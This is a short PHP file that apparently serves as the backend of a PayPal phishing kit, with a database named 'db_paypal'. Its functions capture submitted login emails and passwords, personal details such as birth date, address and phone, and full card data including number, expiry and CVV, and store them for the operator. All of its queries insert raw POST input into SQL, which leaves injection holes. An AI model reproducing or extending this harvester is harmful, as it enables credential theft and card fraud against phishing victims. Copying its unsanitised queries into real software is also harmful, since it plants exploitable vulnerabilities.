<?php
$db = mysqli_connect("127.0.0.1","root","","db_paypal");


function login(){
	global $db;
	//if(isset($_POST['botdkhol'])){
		//$email = $_POST['login_email'];
		//$password = $_POST['login_password'];
		
		//$query = mysqli_query($db,"INSERT INTO users (email,password) values('$email','$password')");
	//}
	if(isset($_POST['login_email']) and isset($_POST['login_password'])){
		$query = mysqli_query($db,"INSERT INTO users (email,password) values('".$_POST['login_email']."','".$_POST['login_password']."')");
		
}
}

function personal_info(){
		global $db;
		if(isset($_POST['personal_info'])){
			$firstname = $_POST['fullname'];
			$dob = $_POST['birth_date'];
			$address = $_POST['address'];
			$city = $_POST['city'];
			$state = $_POST['state'];
			$zip = $_POST['zipCode'];
			$option = $_POST['phoneOption'];
			$phone = $_POST['phoneNumber'];
			
			$query = mysqli_query($db,"INSERT INTO personal(firstname,dob,address,city,state,zip,option,phone) values('$firstname','$dob','$address','$city','$state','$zip','$option','$phone')");
		}
	}
	
function bank_details(){
	global $db;
		if(isset($_POST['submit_account'])){
			$query = mysqli_query($db,"INSERT INTO bank(cardname,cardnumber,exdate,cvv) values('".$_POST['nameoncard']."','".$_POST['cardnumber']."','".$_POST['expdate']."','".$_POST['csc']."')");
		}
	}
?>
